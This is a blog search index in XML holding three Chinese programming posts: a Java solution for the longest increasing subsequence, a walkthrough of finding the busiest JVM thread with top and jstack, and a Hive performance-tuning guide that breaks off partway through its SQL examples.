<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>最长递增子序列的长度</title>
      <link href="/2019/03/16/suan-fa/zui-chang-di-zeng-zi-xu-lie-de-chang-du/"/>
      <url>/2019/03/16/suan-fa/zui-chang-di-zeng-zi-xu-lie-de-chang-du/</url>
      
        <content type="html"><![CDATA[<h2 id="最长递增子序列的长度"><a href="#最长递增子序列的长度" class="headerlink" title="最长递增子序列的长度"></a>最长递增子序列的长度</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个整数数组，你要计算数组里最长递增子序列的长度。其中，<strong>子序列不要求连续</strong>。</p><pre><code>比如说，给你的数组 a 是：1, 8, 2, 6, 4, 5在这个数组里，最长的递增子序列是：1, 2, 4, 5因此你要返回它的长度 4。</code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n^2), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">lengthOfLISDP</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    d<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> cur <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">?</span> d<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>        d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> cur<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> max<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">binarySearchInsertPosition</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> d<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">></span> d<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">return</span> mid<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> low<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*log(n)), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">lengthOfLISBinarySearch</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">,</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">binarySearchInsertPosition</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> len<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>      d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> len<span class="token punctuation">)</span> <span class="token operator">++</span>len<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> len<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二分搜索 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何定位消耗CPU最多的线程</title>
      <link href="/2019/03/15/chang-yong-gong-ju/ru-he-ding-wei-xiao-hao-cpu-zui-duo-de-xian-cheng/"/>
      <url>/2019/03/15/chang-yong-gong-ju/ru-he-ding-wei-xiao-hao-cpu-zui-duo-de-xian-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="如何定位消耗CPU最多的线程"><a href="#如何定位消耗CPU最多的线程" class="headerlink" title="如何定位消耗CPU最多的线程"></a>如何定位消耗CPU最多的线程</h1><p>之前有朋友反馈说发的内容希望有个梯度，逐步加深，前面发了几篇关于jvm源码分析的文章，可能我觉得我已经把内容写得浅显易懂了，但是对于某些没怎么接触的同学来说还是比较难理解，这个我以后慢慢改进吧，今天发篇轻松点的文章，可能大家在工作过程中也会可能碰到类似的问题，或许有经验的同学看到这个题目就知道我要说什么了，也有自己的定位方法。</p><p>话不多说了，先来看代码吧</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                                <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                                        <span class="token keyword">try</span><span class="token punctuation">{</span>                                                Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>                                <span class="token punctuation">}</span>                        <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                Thread t<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                                <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                                        i<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">100</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">;</span>                t<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Busiest Thread"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这个例子里新创建了11个线程，其中10个线程没干什么事，主要是sleep，另外有一个线程在循环里一直跑着，可以想象这个线程是这个进程里最耗cpu的线程了，那怎么把这个线程给抓出来呢？</p><p>首先我们可以通过<code>top -Hp &lt;pid&gt;</code>来看这个进程里所有线程的cpu消耗情况，得到类似下面的数据</p><pre class=" language-shell"><code class="language-shell">$ top -Hp 18207top - 19:11:43 up 573 days,  2:43,  2 users,  load average: 3.03, 3.03, 3.02Tasks:  44 total,   1 running,  43 sleeping,   0 stopped,   0 zombieCpu(s): 18.8%us,  0.0%sy,  0.0%ni, 81.1%id,  0.0%wa,  0.0%hi,  0.0%si,  0.0%stMem:  99191752k total, 98683576k used,   508176k free,   128248k buffersSwap:  1999864k total,   191064k used,  1808800k free, 17413760k cached  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND18250 admin     20   0 26.1g  28m  10m R 99.9  0.0   0:19.50 java Test18207 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18208 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.09 java Test18209 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18210 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18211 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18212 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18213 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18214 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18215 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18216 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18217 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18218 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18219 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18220 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18221 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18222 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18223 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18224 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18225 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18226 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test18227 admin     20   0 26.1g  28m  10m S  0.0  0.0   0:00.00 java Test</code></pre><p>拿到这个结果之后，我们可以看到cpu最高的线程是pid为18250的线程，占了99.8%：</p><pre><code>PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND18250 admin     20   0 26.1g  28m  10m R 99.9  0.0   0:19.50 java Test</code></pre><p>接着我们可以通过<code>jstack &lt;pid&gt;</code>的输出来看各个线程栈:</p><pre class=" language-shell"><code class="language-shell">$ jstack 182072016-03-30 19:12:23Full thread dump OpenJDK 64-Bit Server VM (25.66-b60 mixed mode):"Attach Listener" #30 daemon prio=9 os_prio=0 tid=0x00007fb90be13000 nid=0x47d7 waiting on condition [0x0000000000000000]   java.lang.Thread.State: RUNNABLE"DestroyJavaVM" #29 prio=5 os_prio=0 tid=0x00007fb96245b800 nid=0x4720 waiting on condition [0x0000000000000000]   java.lang.Thread.State: RUNNABLE"Busiest Thread" #28 prio=5 os_prio=0 tid=0x00007fb91498d000 nid=0x474a runnable [0x00007fb9065fe000]   java.lang.Thread.State: RUNNABLE    at Test$2.run(Test.java:18)"Thread-9" #27 prio=5 os_prio=0 tid=0x00007fb91498c800 nid=0x4749 waiting on condition [0x00007fb906bfe000]   java.lang.Thread.State: TIMED_WAITING (sleeping)    at java.lang.Thread.sleep(Native Method)    at Test$1.run(Test.java:9)"Thread-8" #26 prio=5 os_prio=0 tid=0x00007fb91498b800 nid=0x4748 waiting on condition [0x00007fb906ffe000]   java.lang.Thread.State: TIMED_WAITING (sleeping)    at java.lang.Thread.sleep(Native Method)    at Test$1.run(Test.java:9)"Thread-7" #25 prio=5 os_prio=0 tid=0x00007fb91498b000 nid=0x4747 waiting on condition [0x00007fb9073fe000]   java.lang.Thread.State: TIMED_WAITING (sleeping)    at java.lang.Thread.sleep(Native Method)    at Test$1.run(Test.java:9)"Thread-6" #24 prio=5 os_prio=0 tid=0x00007fb91498a000 nid=0x4746 waiting on condition [0x00007fb9077fe000]   java.lang.Thread.State: TIMED_WAITING (sleeping)    at java.lang.Thread.sleep(Native Method)    at Test$1.run(Test.java:9)...</code></pre><p>上面的线程栈我们注意到nid的值其实就是线程ID，它是十六进制的，我们将消耗cpu最高的线程<code>18250</code>，转成十六进制<code>0X47A</code>，然后从上面的线程栈里找到<code>nid=0X47A</code>的线程，其栈为：</p><pre class=" language-shell"><code class="language-shell">"Busiest Thread" #28 prio=5 os_prio=0 tid=0x00007fb91498d000 nid=0x474a runnable [0x00007fb9065fe000]   java.lang.Thread.State: RUNNABLE    at Test$2.run(Test.java:18)</code></pre><p>即将最耗cpu的线程找出来了，是<code>Businest Thread</code></p><p>本文转自：<a href="https://blog.csdn.net/u010647035/article/details/85037206" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hive性能优化(全面)</title>
      <link href="/2019/03/13/hive/hive-xing-neng-you-hua-quan-mian/"/>
      <url>/2019/03/13/hive/hive-xing-neng-you-hua-quan-mian/</url>
      
        <content type="html"><![CDATA[<h1 id="Hive性能优化-全面"><a href="#Hive性能优化-全面" class="headerlink" title="Hive性能优化(全面)"></a>Hive性能优化(全面)</h1><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a><strong>1.介绍</strong></h2><p>首先，我们来看看Hadoop的计算框架特性，在此特性下会衍生哪些问题？</p><ul><li>数据量大不是问题，数据倾斜是个问题。</li><li>jobs数比较多的作业运行效率相对比较低，比如即使有几百行的表，如果多次关联多次汇总，产生十几个jobs，耗时很长。原因是map reduce作业初始化的时间是比较长的。</li><li>sum,count,max,min等UDAF，不怕数据倾斜问题,hadoop在map端的汇总合并优化，使数据倾斜不成问题。</li><li>count(distinct ),在数据量大的情况下，效率较低，如果是多count(distinct )效率更低，因为count(distinct)是按group by 字段分组，按distinct字段排序，一般这种分布方式是很倾斜的。举个例子：比如男uv,女uv，像淘宝一天30亿的pv，如果按性别分组，分配2个reduce,每个reduce处理15亿数据。</li></ul><p>面对这些问题，我们能有哪些有效的优化手段呢？下面列出一些在工作有效可行的优化手段：</p><ul><li>好的模型设计事半功倍。</li><li>解决数据倾斜问题。</li><li>减少job数。</li><li>设置合理的map reduce的task数，能有效提升性能。(比如，10w+级别的计算，用160个reduce，那是相当的浪费，1个足够)。</li><li>了解数据分布，自己动手解决数据倾斜问题是个不错的选择。set hive.groupby.skewindata=true;这是通用的算法优化，但算法优化有时不能适应特定业务背景，开发人员了解业务，了解数据，可以通过业务逻辑精确有效的解决数据倾斜问题。</li><li>数据量较大的情况下，慎用count(distinct)，count(distinct)容易产生倾斜问题。</li><li>对小文件进行合并，是行至有效的提高调度效率的方法，假如所有的作业设置合理的文件数，对云梯的整体调度效率也会产生积极的正向影响。</li><li>优化时把握整体，单个作业最优不如整体最优。</li></ul><p>而接下来，我们心中应该会有一些疑问，影响性能的根源是什么？</p><h2 id="2-性能低下的根源"><a href="#2-性能低下的根源" class="headerlink" title="2.性能低下的根源"></a><strong>2.性能低下的根源</strong></h2><p>hive性能优化时，把HiveQL当做M/R程序来读，即从M/R的运行角度来考虑优化性能，从更底层思考如何优化运算性能，而不仅仅局限于逻辑代码的替换层面。</p><p>RAC（Real Application Cluster）真正应用集群就像一辆机动灵活的小货车，响应快；Hadoop就像吞吐量巨大的轮船，启动开销大，如果每次只做小数量的输入输出，利用率将会很低。所以用好Hadoop的首要任务是增大每次任务所搭载的数据量。</p><p>Hadoop的核心能力是parition和sort，因而这也是优化的根本。</p><p>观察Hadoop处理数据的过程，有几个显著的特征：</p><ul><li>数据的大规模并不是负载重点，造成运行压力过大是因为运行数据的倾斜。</li><li>jobs数比较多的作业运行效率相对比较低，比如即使有几百行的表，如果多次关联对此汇总，产生几十个jobs，将会需要30分钟以上的时间且大部分时间被用于作业分配，初始化和数据输出。M/R作业初始化的时间是比较耗时间资源的一个部分。</li><li>在使用SUM，COUNT，MAX，MIN等UDAF函数时，不怕数据倾斜问题，Hadoop在Map端的汇总合并优化过，使数据倾斜不成问题。</li><li>COUNT(DISTINCT)在数据量大的情况下，效率较低，如果多COUNT(DISTINCT)效率更低，因为COUNT(DISTINCT)是按GROUP BY字段分组，按DISTINCT字段排序，一般这种分布式方式是很倾斜的；比如：男UV，女UV，淘宝一天30亿的PV，如果按性别分组，分配2个reduce,每个reduce处理15亿数据。</li><li>数据倾斜是导致效率大幅降低的主要原因，可以采用多一次 Map/Reduce 的方法， 避免倾斜。</li></ul><p>最后得出的结论是：避实就虚，用 job 数的增加，输入量的增加，占用更多存储空间，充分利用空闲 CPU 等各种方法，分解数据倾斜造成的负担。</p><h2 id="3-配置角度优化"><a href="#3-配置角度优化" class="headerlink" title="3.配置角度优化"></a><strong>3.配置角度优化</strong></h2><p>我们知道了性能低下的根源，同样，我们也可以从Hive的配置解读去优化。Hive系统内部已针对不同的查询预设定了优化方法，用户可以通过调整配置进行控制， 以下举例介绍部分优化的策略以及优化控制选项。</p><h3 id="3-1列裁剪"><a href="#3-1列裁剪" class="headerlink" title="3.1列裁剪"></a><strong>3.1列裁剪</strong></h3><p>Hive 在读数据的时候，可以只读取查询中所需要用到的列，而忽略其它列。 例如，若有以下查询：</p><p>SELECT a,b FROM q WHERE e&lt;10;</p><p>在实施此项查询中，Q 表有 5 列（a，b，c，d，e），Hive 只读取查询逻辑中真实需要 的 3 列 a、b、e，而忽略列 c，d；这样做节省了读取开销，中间表存储开销和数据整合开销。</p><p>裁剪所对应的参数项为：hive.optimize.cp=true（默认值为真）</p><h3 id="3-2分区裁剪"><a href="#3-2分区裁剪" class="headerlink" title="3.2分区裁剪"></a><strong>3.2分区裁剪</strong></h3><p>可以在查询的过程中减少不必要的分区。 例如，若有以下查询：</p><p>SELECT <em> FROM (SELECTT a1,COUNT(1) FROM T GROUP BY a1) subq WHERE subq.prtn=100; #（多余分区）SELECT </em> FROM T1 JOIN (SELECT * FROM T2) subq ON (T1.a1=subq.a2) WHERE subq.prtn=100;</p><p>查询语句若将“subq.prtn=100”条件放入子查询中更为高效，可以减少读入的分区 数目。 Hive 自动执行这种裁剪优化。</p><p>分区参数为：hive.optimize.pruner=true（默认值为真）</p><h3 id="3-3JOIN操作"><a href="#3-3JOIN操作" class="headerlink" title="3.3JOIN操作"></a><strong>3.3JOIN操作</strong></h3><p>在编写带有 join 操作的代码语句时，应该将条目少的表/子查询放在 Join 操作符的左边。 因为在 Reduce 阶段，位于 Join 操作符左边的表的内容会被加载进内存，载入条目较少的表 可以有效减少 OOM（out of memory）即内存溢出。所以对于同一个 key 来说，对应的 value 值小的放前，大的放后，这便是“小表放前”原则。 若一条语句中有多个 Join，依据 Join 的条件相同与否，有不同的处理方法。</p><h3 id="3-3-1JOIN原则"><a href="#3-3-1JOIN原则" class="headerlink" title="3.3.1JOIN原则"></a><strong>3.3.1JOIN原则</strong></h3><p>在使用写有 Join 操作的查询语句时有一条原则：应该将条目少的表/子查询放在 Join 操作符的左边。原因是在 Join 操作的 Reduce 阶段，位于 Join 操作符左边的表的内容会被加载进内存，将条目少的表放在左边，可以有效减少发生 OOM 错误的几率。对于一条语句中有多个 Join 的情况，如果 Join 的条件相同，比如查询：</p><p>INSERT OVERWRITE TABLE pv_users</p><p>SELECT pv.pageid, u.age FROM page_view p</p><p>JOIN user u ON (pv.userid = u.userid)</p><p>JOIN newuser x ON (u.userid = x.userid);</p><ul><li>如果 Join 的 key 相同，不管有多少个表，都会则会合并为一个 Map-Reduce</li><li>一个 Map-Reduce 任务，而不是 ‘n’ 个</li><li>在做 OUTER JOIN 的时候也是一样</li></ul><p>如果 Join 的条件不相同，比如：</p><p>INSERT OVERWRITE TABLE pv_users</p><p>SELECT pv.pageid, u.age FROM page_view p</p><p>JOIN user u ON (pv.userid = u.userid)</p><p>JOIN newuser x on (u.age = x.age);</p><p>Map-Reduce 的任务数目和 Join 操作的数目是对应的，上述查询和以下查询是等价的：</p><p>INSERT OVERWRITE TABLE tmptable</p><p>SELECT * FROM page_view p JOIN user u</p><p>ON (pv.userid = u.userid);</p><p>INSERT OVERWRITE TABLE pv_users</p><p>SELECT x.pageid, x.age FROM tmptable x</p><p>JOIN newuser y ON (x.age = y.age);</p><h3 id="3-4MAP-JOIN操作"><a href="#3-4MAP-JOIN操作" class="headerlink" title="3.4MAP JOIN操作"></a><strong>3.4MAP JOIN操作</strong></h3><p>Join 操作在 Map 阶段完成，不再需要Reduce，前提条件是需要的数据在 Map 的过程中可以访问到。比如查询：</p><p>INSERT OVERWRITE TABLE pv_users</p><p>SELECT /<em>+ MAPJOIN(pv) </em>/ pv.pageid, u.age</p><p>FROM page_view pv</p><p>JOIN user u ON (pv.userid = u.userid);</p><p>可以在 Map 阶段完成 Join.</p><p>相关的参数为：</p><ul><li><strong>hive.join.emit.interval = 1000</strong></li><li><strong>hive.mapjoin.size.key = 10000</strong></li><li><strong>hive.mapjoin.cache.numrows = 10000</strong></li></ul><h3 id="3-5GROUP-BY操作"><a href="#3-5GROUP-BY操作" class="headerlink" title="3.5GROUP BY操作"></a><strong>3.5GROUP BY操作</strong></h3><p>进行GROUP BY操作时需要注意一下几点：</p><ul><li>Map端部分聚合</li></ul><p>事实上并不是所有的聚合操作都需要在reduce部分进行，很多聚合操作都可以先在Map端进行部分聚合，然后reduce端得出最终结果。</p><p>这里需要修改的参数为：</p><p>hive.map.aggr=true（用于设定是否在 map 端进行聚合，默认值为真） hive.groupby.mapaggr.checkinterval=100000（用于设定 map 端进行聚合操作的条目数）</p><ul><li>有数据倾斜时进行负载均衡</li></ul><p>此处需要设定 hive.groupby.skewindata，当选项设定为 true 是，生成的查询计划有两 个 MapReduce 任务。在第一个 MapReduce 中，map 的输出结果集合会随机分布到 reduce 中， 每个 reduce 做部分聚合操作，并输出结果。这样处理的结果是，相同的 Group By Key 有可 能分发到不同的 reduce 中，从而达到负载均衡的目的；第二个 MapReduce 任务再根据预处 理的数据结果按照 Group By Key 分布到 reduce 中（这个过程可以保证相同的 Group By Key 分布到同一个 reduce 中），最后完成最终的聚合操作。</p><h3 id="3-6合并小文件"><a href="#3-6合并小文件" class="headerlink" title="3.6合并小文件"></a><strong>3.6合并小文件</strong></h3><p>我们知道文件数目小，容易在文件存储端造成瓶颈，给 HDFS 带来压力，影响处理效率。对此，可以通过合并Map和Reduce的结果文件来消除这样的影响。</p><p>用于设置合并属性的参数有：</p><ul><li>是否合并Map输出文件：hive.merge.mapfiles=true（默认值为真）</li><li>是否合并Reduce 端输出文件：hive.merge.mapredfiles=false（默认值为假）</li><li>合并文件的大小：hive.merge.size.per.task=256<em>1000</em>1000（默认值为 256000000）</li></ul><h2 id="4-程序角度优化"><a href="#4-程序角度优化" class="headerlink" title="4.程序角度优化"></a><strong>4.程序角度优化</strong></h2><h3 id="4-1熟练使用SQL提高查询"><a href="#4-1熟练使用SQL提高查询" class="headerlink" title="4.1熟练使用SQL提高查询"></a><strong>4.1熟练使用SQL提高查询</strong></h3><p>熟练地使用 SQL，能写出高效率的查询语句。</p><p>场景：有一张 user 表，为卖家每天收到表，user_id，ds（日期）为 key，属性有主营类目，指标有交易金额，交易笔数。每天要取前10天的总收入，总笔数，和最近一天的主营类目。</p><p> <strong>解决方法 1</strong></p><p>如下所示：常用方法</p><p>INSERT OVERWRITE TABLE t1</p><p>SELECT user_id,substr(MAX(CONCAT(ds,cat),9) AS main_cat) FROM users</p><p>WHERE ds=20120329 // 20120329 为日期列的值，实际代码中可以用函数表示出当天日期 GROUP BY user_id;</p><p>INSERT OVERWRITE TABLE t2</p><p>SELECT user_id,sum(qty) AS qty,SUM(amt) AS amt FROM users</p><p>WHERE ds BETWEEN 20120301 AND 20120329</p><p>GROUP BY user_id</p><p>SELECT t1.user_id,t1.main_cat,t2.qty,t2.amt FROM t1</p><p>JOIN t2 ON t1.user_id=t2.user_id</p><p>下面给出方法1的思路，实现步骤如下：</p><p>第一步：利用分析函数，取每个 user_id 最近一天的主营类目，存入临时表 t1。</p><p>第二步：汇总 10 天的总交易金额，交易笔数，存入临时表 t2。</p><p>第三步：关联 t1，t2，得到最终的结果。</p><p><strong>解决方法 2</strong></p><p>如下所示：优化方法</p><p>SELECT user_id,substr(MAX(CONCAT(ds,cat)),9) AS main_cat,SUM(qty),SUM(amt) FROM users</p><p>WHERE ds BETWEEN 20120301 AND 20120329</p><p>GROUP BY user_id</p><p>在工作中我们总结出：方案 2 的开销等于方案 1 的第二步的开销，性能提升，由原有的 25 分钟完成，缩短为 10 分钟以内完成。节省了两个临时表的读写是一个关键原因，这种方式也适用于 Oracle 中的数据查找工作。</p><p>SQL 具有普适性，很多 SQL 通用的优化方案在 Hadoop 分布式计算方式中也可以达到效果。</p><h3 id="4-2无效ID在关联时的数据倾斜问题"><a href="#4-2无效ID在关联时的数据倾斜问题" class="headerlink" title="4.2无效ID在关联时的数据倾斜问题"></a><strong>4.2无效ID在关联时的数据倾斜问题</strong></h3><p>问题：日志中常会出现信息丢失，比如每日约为 20 亿的全网日志，其中的 user_id 为主 键，在日志收集过程中会丢失，出现主键为 null 的情况，如果取其中的 user_id 和 bmw_users 关联，就会碰到数据倾斜的问题。原因是 Hive 中，主键为 null 值的项会被当做相同的 Key 而分配进同一个计算 Map。</p><p>解决方法 1：user_id 为空的不参与关联，子查询过滤 null</p><p>SELECT * FROM log a</p><p>JOIN bmw_users b ON a.user_id IS NOT NULL AND a.user_id=b.user_id</p><p>UNION All SELECT * FROM log a WHERE a.user_id IS NULL</p><p>解决方法 2 如下所示：函数过滤 null</p><p>SELECT * FROM log a LEFT OUTER</p><p>JOIN bmw_users b ON</p><p>CASE WHEN a.user_id IS NULL THEN CONCAT(‘dp_hive’,RAND()) ELSE a.user_id END 